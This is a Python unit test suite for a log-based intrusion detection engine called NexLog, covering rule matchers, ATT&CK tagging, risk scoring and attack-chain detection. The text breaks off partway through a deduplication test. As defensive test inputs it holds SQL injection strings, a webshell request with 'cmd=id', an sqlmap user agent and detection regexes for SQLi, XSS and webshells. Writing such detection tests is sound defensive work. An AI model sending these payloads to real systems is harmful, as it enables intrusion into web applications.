"""
tests/unit/test_layer2.py â€” NexLog Layer 2
Complete test suite. 97 tests.
Run: python test_layer2.py
"""

import json
import os
import sys
import tempfile
from datetime import datetime, timezone, timedelta

# â”€â”€ Path resolution â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Walks up from this file's location until it finds the project root
# (identified by the presence of core/ and detection/ directories).
# Works correctly regardless of where the file is placed or how it is run:
#   python3 tests/unit/test_layer2.py          (from project root)
#   cd tests/unit && python3 test_layer2.py    (from tests/unit/)
#   python3 test_layer2.py                     (file copied to project root)

_root = os.path.dirname(os.path.abspath(__file__))
for _ in range(8):
    if os.path.isfile(os.path.join(_root, 'pathconfig.py')):
        break
    _root = os.path.dirname(_root)
if _root not in sys.path:
    sys.path.insert(0, _root)
from pathconfig import ROOT, add_root
add_root()
_ROOT = ROOT
sys.path.insert(0, os.path.join(_ROOT, 'core'))
sys.path.insert(0, os.path.join(_ROOT, 'detection'))

from models import LogEntry, LogFormat
from finding import Finding, Severity, MitreTag
from pattern_matcher import (
    RegexMatcher, ThresholdMatcher,
    SequenceMatcher, CompositeRule,
    _entry_matches_filter,
)
from attck_tagger import (
    build_mitre_tags, adjust_confidence,
    compute_risk_score, detect_attack_chain,
)
from rule_engine import RuleEngine

# â”€â”€ helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
_passed = _failed = 0

def check(name: str, cond: bool, detail: str = "") -> None:
    global _passed, _failed
    if cond:
        _passed += 1
        print(f"  PASS  {name}")
    else:
        _failed += 1
        print(f"  FAIL  {name}" + (f"  [{detail}]" if detail else ""))

def make_entry(**kw) -> LogEntry:
    defaults = dict(
        raw_line="test line", line_number=1, source_file="test.log",
        log_format=LogFormat.APACHE_COMBINED,
        timestamp=datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc),
    )
    defaults.update(kw)
    return LogEntry(**defaults)

def _json_safe(d: dict) -> bool:
    try:
        json.dumps(d)
        return True
    except TypeError:
        return False


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 1. Finding â€” all fields, to_dict, from_dict, risk_score
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_finding_model():
    print("\nâ”€â”€ 1. Finding model â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    tag = MitreTag("TA0001", "Initial Access", "T1190", "Exploit App", ".001")
    f   = Finding(
        rule_id="WEB-001", rule_name="SQLi", description="SQL injection",
        severity=Severity.HIGH, confidence=0.87, category="web_attack",
        mitre_tags=[tag],
        source_ip="1.2.3.4", hostname="webserver01",
        process_name="apache2", event_id="4688",
        timestamp=datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc),
        supporting_lines=["line1", "line2"],
    )
    d = f.to_dict()

    check("severity is string",             d["severity"] == "HIGH")
    check("confidence rounded",             d["confidence"] == 0.87)
    check("risk_score in to_dict",          "risk_score" in d)
    check("risk_score > 0",                 d["risk_score"] > 0)
    check("mitre_ids present",              "T1190.001" in d["mitre_ids"])
    check("mitre_tags is list of dicts",    isinstance(d["mitre_tags"][0], dict))
    check("tactic_names present",           "Initial Access" in d["tactic_names"])
    check("timestamp is ISO string",        isinstance(d["timestamp"], str))
    check("supporting_lines in to_dict",    "supporting_lines" in d)
    check("supporting_lines has content",   len(d["supporting_lines"]) == 2)
    check("hostname in to_dict",            d["hostname"] == "webserver01")
    check("process_name in to_dict",        d["process_name"] == "apache2")
    check("event_id in to_dict",            d["event_id"] == "4688")
    check("to_dict JSON-serialisable",      _json_safe(d))

    # risk_score property
    check("risk_score property <= 10",      f.risk_score <= 10.0)
    check("risk_score property type float", isinstance(f.risk_score, float))

    # severity ordering
    check("CRITICAL > HIGH",               Severity.CRITICAL > Severity.HIGH)
    check("HIGH > MEDIUM",                 Severity.HIGH > Severity.MEDIUM)
    check("INFO < LOW",                    Severity.INFO < Severity.LOW)

    # repr
    check("repr contains rule_id",         "WEB-001" in repr(f))
    check("repr contains risk=",           "risk=" in repr(f))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 2. Finding â€” from_dict round-trip
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_finding_round_trip():
    print("\nâ”€â”€ 2. Finding from_dict round-trip â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    original = Finding(
        rule_id="AUTH-002", rule_name="SSH Root", description="root login",
        severity=Severity.CRITICAL, confidence=0.95, category="auth",
        mitre_tags=[MitreTag("TA0006","Cred Access","T1110","Brute Force",".001")],
        source_ip="10.0.0.1", hostname="bastion01",
        timestamp=datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc),
        supporting_lines=["fail1", "fail2", "success"],
    )
    d        = original.to_dict()
    restored = Finding.from_dict(d)

    check("rule_id preserved",            restored.rule_id      == original.rule_id)
    check("severity preserved",           restored.severity     == original.severity)
    check("confidence preserved",         restored.confidence   == original.confidence)
    check("hostname preserved",           restored.hostname     == original.hostname)
    check("supporting_lines preserved",   restored.supporting_lines == original.supporting_lines)
    check("mitre_tags restored",          len(restored.mitre_tags) == 1)
    check("technique full_id restored",   restored.mitre_tags[0].full_id == "T1110.001")
    check("timestamp restored",           restored.timestamp is not None)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 3. _entry_matches_filter â€” all filter keys
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_filter_keys():
    print("\nâ”€â”€ 3. _entry_matches_filter all keys â”€â”€â”€â”€â”€â”€â”€")

    e = make_entry(
        auth_result="failure", http_status=401, http_method="POST",
        event_id="4625", process_name="sshd",
        username="alice", hostname="server01",
    )

    check("auth_result match",            _entry_matches_filter(e, {"auth_result": "failure"}))
    check("auth_result no-match",     not _entry_matches_filter(e, {"auth_result": "success"}))
    check("http_status_in match",         _entry_matches_filter(e, {"http_status_in": [401, 403]}))
    check("http_status_in no-match",  not _entry_matches_filter(e, {"http_status_in": [200]}))
    check("http_method match",            _entry_matches_filter(e, {"http_method": "POST"}))
    check("http_method no-match",     not _entry_matches_filter(e, {"http_method": "GET"}))
    check("event_id match",               _entry_matches_filter(e, {"event_id": "4625"}))
    check("event_id no-match",        not _entry_matches_filter(e, {"event_id": "4624"}))
    check("process_name_contains",        _entry_matches_filter(e, {"process_name_contains": "ssh"}))
    check("username_contains match",      _entry_matches_filter(e, {"username_contains": "alic"}))
    check("username_contains no-match",not _entry_matches_filter(e, {"username_contains": "bob"}))
    check("hostname_contains match",      _entry_matches_filter(e, {"hostname_contains": "server"}))
    check("hostname_contains no-match",not _entry_matches_filter(e, {"hostname_contains": "dc01"}))
    check("empty filter passes all",      _entry_matches_filter(e, {}))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 4. RegexMatcher
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_regex_matcher():
    print("\nâ”€â”€ 4. RegexMatcher â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    m = RegexMatcher("http_uri_decoded", r"(?i)union.*select")

    sqli  = make_entry(http_uri_decoded="/q=1'+UNION+SELECT+1,2,3--")
    ok, ctx = m.match(sqli)
    check("SQLi match fires",              ok)
    check("context.matched_text set",      "matched_text" in ctx)
    check("context.matched_field set",     ctx.get("matched_field") == "http_uri_decoded")

    clean = make_entry(http_uri_decoded="/search?q=hello")
    ok2, _ = m.match(clean)
    check("clean URI no-match",            not ok2)

    none_f = make_entry(http_uri_decoded=None)
    ok3, _ = m.match(none_f)
    check("None field no-match",           not ok3)

    # filter integration
    m2 = RegexMatcher("http_uri_decoded", r"upload",
                      filter_dict={"http_method": "POST"})
    check("filter GET skipped",    not m2.match(make_entry(http_uri_decoded="/upload.php", http_method="GET"))[0])
    check("filter POST matched",       m2.match(make_entry(http_uri_decoded="/upload.php", http_method="POST"))[0])


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 5. ThresholdMatcher
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_threshold_matcher():
    print("\nâ”€â”€ 5. ThresholdMatcher â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    tm   = ThresholdMatcher("source_ip", count=5, window_secs=60,
                            filter_dict={"auth_result": "failure"})
    base = datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc)

    for i in range(4):
        ok, _ = tm.match(make_entry(source_ip="1.2.3.4",
                                    auth_result="failure",
                                    timestamp=base + timedelta(seconds=i*5)))
        check(f"  fail {i+1}/4 no trigger",  not ok)

    ok5, ctx5 = tm.match(make_entry(source_ip="1.2.3.4", auth_result="failure",
                                    timestamp=base + timedelta(seconds=25)))
    check("5th failure triggers",             ok5)
    check("context.event_count == 5",         ctx5.get("event_count") == 5)
    check("context.window_secs set",          "window_secs" in ctx5)

    # Different IP never triggers
    ok_o, _ = tm.match(make_entry(source_ip="9.9.9.9", auth_result="failure",
                                  timestamp=base))
    check("different IP no trigger",           not ok_o)

    # Success events filtered out
    tm2  = ThresholdMatcher("source_ip", 3, 60,
                            filter_dict={"auth_result": "failure"})
    last = False
    for _ in range(5):
        last, _ = tm2.match(make_entry(source_ip="5.5.5.5",
                                       auth_result="success", timestamp=base))
    check("success events not counted",        not last)

    # count_distinct
    tm3 = ThresholdMatcher("source_ip", 3, 60, count_distinct="username",
                           filter_dict={"auth_result": "failure"})
    users = ["alice", "bob", "carol"]
    results = []
    for u in users:
        ok_d, _ = tm3.match(make_entry(source_ip="1.1.1.1",
                                       auth_result="failure", username=u,
                                       timestamp=base))
        results.append(ok_d)
    check("count_distinct triggers on 3rd unique user", results[-1])


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 6. SequenceMatcher â€” exact value
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_sequence_exact():
    print("\nâ”€â”€ 6. SequenceMatcher (exact) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    steps = [
        {"match_field": "auth_result", "value": "failure",
         "match_field2": "username",   "value2": "root"},
        {"match_field": "auth_result", "value": "success",
         "match_field2": "username",   "value2": "root"},
    ]
    sm   = SequenceMatcher(steps=steps, group_by="source_ip", window_secs=300)
    base = datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc)

    ok1, _ = sm.match(make_entry(source_ip="1.2.3.4", auth_result="failure",
                                 username="root", timestamp=base))
    check("step1 alone: no trigger",           not ok1)

    ok2, ctx2 = sm.match(make_entry(source_ip="1.2.3.4", auth_result="success",
                                    username="root",
                                    timestamp=base + timedelta(seconds=10)))
    check("step2 completes sequence",           ok2)
    check("steps_matched == 2",                 ctx2.get("steps_matched") == 2)
    check("sequence_duration in context",       "sequence_duration" in ctx2)

    ok3, _ = sm.match(make_entry(source_ip="8.8.8.8", auth_result="success",
                                 username="root", timestamp=base))
    check("different IP does not trigger",      not ok3)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 7. SequenceMatcher â€” value_contains + min_count
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_sequence_advanced():
    print("\nâ”€â”€ 7. SequenceMatcher (contains + min_count)")
    base = datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc)

    # value_contains
    steps_vc = [
        {"match_field": "message", "value_contains": "sudo -l"},
        {"match_field": "message", "value_contains": "sudo"},
    ]
    sm_vc = SequenceMatcher(steps=steps_vc, group_by="source_ip", window_secs=120)
    ok1, _  = sm_vc.match(make_entry(source_ip="1.1.1.1",
                                     message="ran sudo -l to enumerate", timestamp=base))
    ok2, c2 = sm_vc.match(make_entry(source_ip="1.1.1.1",
                                     message="sudo python3 -c import os",
                                     timestamp=base+timedelta(seconds=30)))
    check("value_contains step1 no trigger",    not ok1)
    check("value_contains step2 triggers",       ok2)
    check("steps_matched == 2",                  c2.get("steps_matched") == 2)

    # min_count: step must match 3 times before advancing
    steps_mc = [
        {"match_field": "auth_result", "value": "failure", "min_count": 3},
        {"match_field": "auth_result", "value": "success"},
    ]
    sm_mc = SequenceMatcher(steps=steps_mc, group_by="source_ip", window_secs=120)
    for i in range(2):
        ok_mc, _ = sm_mc.match(make_entry(source_ip="2.2.2.2",
                                          auth_result="failure",
                                          timestamp=base+timedelta(seconds=i)))
        check(f"  min_count: {i+1}/3 fails â€” no advance", not ok_mc)

    ok_mc3, _ = sm_mc.match(make_entry(source_ip="2.2.2.2", auth_result="failure",
                                       timestamp=base+timedelta(seconds=3)))
    check("min_count: 3rd fail â€” step advances", not ok_mc3)  # advanced but not complete

    ok_final, ctx_mc = sm_mc.match(make_entry(source_ip="2.2.2.2",
                                              auth_result="success",
                                              timestamp=base+timedelta(seconds=4)))
    check("min_count: success after 3 fails triggers", ok_final)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 8. CompositeRule
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_composite_rule():
    print("\nâ”€â”€ 8. CompositeRule â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    base = datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc)

    # AND: brute force threshold + webshell regex â†’ both must fire for same IP
    sub1 = ThresholdMatcher("source_ip", count=3, window_secs=60,
                            filter_dict={"auth_result": "failure"})
    sub2 = RegexMatcher("http_uri_decoded", r"(?i)(cmd|shell)=")
    composite = CompositeRule(
        sub_matchers=[sub1, sub2],
        group_by="source_ip",
        window_secs=300,
        logic="AND",
        name="BruteForce+Webshell",
    )

    # Fire threshold first: 3 auth failures
    for i in range(3):
        ok, _ = composite.match(
            make_entry(source_ip="5.5.5.5", auth_result="failure",
                       timestamp=base + timedelta(seconds=i)))
        check(f"  AND: threshold {i+1}/3 alone no trigger",  not ok)

    # Now fire regex sub-matcher â€” composite should trigger
    ok_c, ctx_c = composite.match(
        make_entry(source_ip="5.5.5.5",
                   http_uri_decoded="/shell.php?cmd=id",
                   timestamp=base + timedelta(seconds=10)))
    check("AND: both fire â†’ composite triggers",   ok_c)
    check("context.logic == AND",                  ctx_c.get("logic") == "AND")
    check("context.sub_matchers_fired == 2",       ctx_c.get("sub_matchers_fired") == 2)

    # OR logic â€” any one fires immediately
    sub_a = RegexMatcher("http_uri_decoded", r"(?i)union.*select")
    sub_b = RegexMatcher("http_uri_decoded", r"(?i)<script>")
    comp_or = CompositeRule(
        sub_matchers=[sub_a, sub_b],
        group_by="source_ip",
        window_secs=60,
        logic="OR",
    )
    ok_or, ctx_or = comp_or.match(
        make_entry(source_ip="6.6.6.6",
                   http_uri_decoded="/search?q='+UNION+SELECT+1--"))
    check("OR: first sub fires â†’ triggers",        ok_or)
    check("context.logic == OR",                   ctx_or.get("logic") == "OR")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 9. ATT&CK tagger
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_attck_tagger():
    print("\nâ”€â”€ 9. ATT&CK tagger â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    tags = build_mitre_tags([{
        "tactic_id": "TA0001", "tactic_name": "Initial Access",
        "technique_id": "T1190", "technique_name": "Exploit App",
        "sub_technique": ".001",
    }])
    check("builds MitreTag",                len(tags) == 1)
    check("full_id with sub-technique",     tags[0].full_id == "T1190.001")
    check("MitreTag.__str__ correct",       "T1190.001" in str(tags[0]))
    check("MitreTag.to_dict works",         isinstance(tags[0].to_dict(), dict))
    check("MitreTag.from_dict round-trip",
          MitreTag.from_dict(tags[0].to_dict()).full_id == "T1190.001")

    boosted = make_entry(source_ip="203.0.113.5",
                         http_user_agent="sqlmap/1.7",
                         http_status=200, http_method="POST")
    conf = adjust_confidence(0.85, boosted, tags, {})
    check("attack tool UA boosts conf",     conf > 0.85,  f"got {conf:.3f}")
    check("conf never > 1.0",              conf <= 1.0)

    internal = make_entry(source_ip="192.168.1.50")
    conf2 = adjust_confidence(0.85, internal, tags, {})
    check("internal IP penalises conf",     conf2 < 0.85, f"got {conf2:.3f}")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 10. Risk scoring + attack chain
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_risk_and_chains():
    print("\nâ”€â”€ 10. Risk scoring + attack chains â”€â”€â”€â”€â”€â”€â”€â”€")
    f_crit = Finding("IMP-001","Ransomware","t",Severity.CRITICAL,0.92,
                     "impact",source_ip="1.2.3.4",mitre_tags=[])
    f_med  = Finding("BOT-001","Bot","t",Severity.MEDIUM,0.70,
                     "bot_activity",source_ip="1.2.3.4",mitre_tags=[])

    s1 = compute_risk_score(f_crit, 1.0)
    s2 = compute_risk_score(f_crit, 2.0)
    s3 = compute_risk_score(f_med,  1.0)
    check("CRITICAL score > 7",        s1  > 7.0,  f"got {s1}")
    check("asset_value=2 raises score", s2 > s1)
    check("score capped at 10",         s2 <= 10.0)
    check("MEDIUM < CRITICAL",          s3  < s1)

    def mk(rid, cat, ip="1.2.3.4"):
        return Finding(rid,"t","t",Severity.HIGH,0.85,cat,
                       source_ip=ip,mitre_tags=[])

    chains = detect_attack_chain([
        mk("RECON-001","recon"),
        mk("WEB-001","web_attack"),
        mk("PERS-001","persistence"),
    ])
    names = [c["chain_name"] for c in chains]
    check("Full Web Compromise chain",  "Full Web Compromise" in names, f"{names}")

    chains2 = detect_attack_chain([
        mk("AUTH-001","auth"),
        mk("PRIV-001","privilege_escalation"),
        mk("IMP-001","impact"),
    ])
    check("Ransomware chain",
          "Full Compromise to Ransomware" in [c["chain_name"] for c in chains2])

    # Split IPs â†’ no chain
    chains3 = detect_attack_chain([
        mk("RECON-001","recon",      ip="1.1.1.1"),
        mk("WEB-001","web_attack",   ip="2.2.2.2"),
        mk("PERS-001","persistence", ip="3.3.3.3"),
    ])
    check("Split IPs: no chain",        len(chains3) == 0)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 11. RuleEngine â€” loading, lookup, new methods
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_rule_engine_api():
    print("\nâ”€â”€ 11. RuleEngine API â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€")
    rules_dir = os.path.join(_ROOT, "detection", "rules")
    if not os.path.exists(rules_dir):
        print("  SKIP  rules dir not found")
        return

    engine = RuleEngine(rules_dir)
    check("loaded > 100 rules",             engine._rules_loaded > 100,
          f"got {engine._rules_loaded}")

    # get_rule
    r = engine.get_rule("WEB-001")
    check("get_rule('WEB-001') found",      r is not None)
    check("get_rule returns correct id",    r.rule_id == "WEB-001" if r else False)
    check("get_rule unknown returns None",  engine.get_rule("FAKE-999") is None)

    # get_rules_by_category
    web_rules = engine.get_rules_by_category("web_attack")
    check("get_rules_by_category non-empty", len(web_rules) > 0)
    check("all returned are web_attack cat",
          all(r.category == "web_attack" for r in web_rules))

    # get_loaded_categories
    cats = engine.get_loaded_categories()
    check("categories is a set",            isinstance(cats, set))
    check("web_attack category present",    "web_attack" in cats)
    check("auth category present",          "auth" in cats)

    # load_rule_from_dict
    engine.load_rule_from_dict({
        "id": "TEST-999", "name": "Test Rule",
        "description": "runtime test",
        "severity": "LOW", "category": "test",
        "confidence": 0.5, "type": "regex",
        "match_field": "message", "pattern": "UNIQUE_TEST_STRING_XYZ",
        "mitre": [], "indicators": [],
    })
    check("load_rule_from_dict works",      engine.get_rule("TEST-999") is not None)

    # summary structure
    # evaluate something first so findings > 0
    engine.evaluate(make_entry(
        source_ip="203.0.113.5",
        http_uri_decoded="/login?q=' OR 1=1--",
        http_user_agent="sqlmap/1.7",
        http_status=200, http_method="GET",
    ))
    summary = engine.summary()
    check("summary.rules_loaded",           "rules_loaded"          in summary)
    check("summary.findings_by_category",   "findings_by_category"  in summary)
    check("summary.rules_by_type",          "rules_by_type"         in summary)
    check("summary.top_fired_rules",        "top_fired_rules"       in summary)
    check("top_fired_rules is list",        isinstance(summary["top_fired_rules"], list))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 12. RuleEngine â€” evaluate populates hostname/process_name/event_id
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_engine_populates_new_fields():
    print("\nâ”€â”€ 12. Engine populates new Finding fields â”€")
    rules_dir = os.path.join(_ROOT, "detection", "rules")
    if not os.path.exists(rules_dir):
        print("  SKIP"); return

    engine = RuleEngine(rules_dir)
    entry  = make_entry(
        source_ip="203.0.113.5",
        hostname="webserver01",
        process_name="nginx",
        event_id="4625",
        http_uri_decoded="/login?user=admin'+OR+1=1--",
        http_user_agent="sqlmap/1.7",
        http_status=200, http_method="GET",
    )
    findings = engine.evaluate(entry)
    check("at least one finding",           len(findings) > 0)
    if findings:
        f = findings[0]
        check("hostname populated",         f.hostname     == "webserver01")
        check("process_name populated",     f.process_name == "nginx")
        check("event_id populated",         f.event_id     == "4625")
        check("to_dict has hostname",       f.to_dict().get("hostname") == "webserver01")
        check("supporting_lines is list",   isinstance(f.supporting_lines, list))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# 13. filter_findings + deduplicate_findings
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
def test_filter_and_dedup():
    print("\nâ”€â”€ 13. filter_findings + deduplicate â”€â”€â”€â”€â”€â”€â”€")
    base = datetime(2026, 1, 4, 10, 0, 0, tzinfo=timezone.utc)

    findings = [
        Finding("W1","A","t",Severity.CRITICAL,0.9,"web_attack",
                source_ip="1.1.1.1",timestamp=base,mitre_tags=[]),
        Finding("W2","B","t",Severity.HIGH,    0.8,"web_attack",
                source_ip="1.1.1.1",timestamp=base+timedelta(seconds=5),mitre_tags=[]),
        Finding("A1","C","t",Severity.MEDIUM,  0.7,"auth",
                source_ip="2.2.2.2",timestamp=base,mitre_tags=[]),
        Finding("A2","D","t",Severity.LOW,     0.5,"auth",
                source_ip="2.2.2.2",timestamp=base,mitre_tags=[]),
    ]

    # filter by severity
    highs = RuleEngine.filter_findings(findings, min_severity=Severity.HIGH)
    check("filter HIGH+: 2 results",        len(highs) == 2,  f"got {len(highs)}")

    # filter by category
    web_f = RuleEngine.filter_findings(findings, category="web_attack")
    check("filter web_attack: 2 results",   len(web_f) == 2)

    # filter by confidence
    conf_f = RuleEngine.filter_findings(findings, min_confidence=0.8)
    check("filter conf>=0.8: 2 results",    len(conf_f) == 2)

    # deduplicate â€” same rule_id + source_ip within 60s
    dupes = [
        Finding("W1","A","t",Severity.CRITICAL,0.9,"web_attack",
                source_ip="1.1.1.1",timestamp=base,mitre_tags=[],
                trigger_line="line-a"),
        Finding("W1","A","t",Severity.CRITICAL,0.9,"web_attack",
                source_ip="1.1.1.1",timestamp=base+timedelta(seconds=5),mitre_tags=[],
                trigger_line="line-b"),
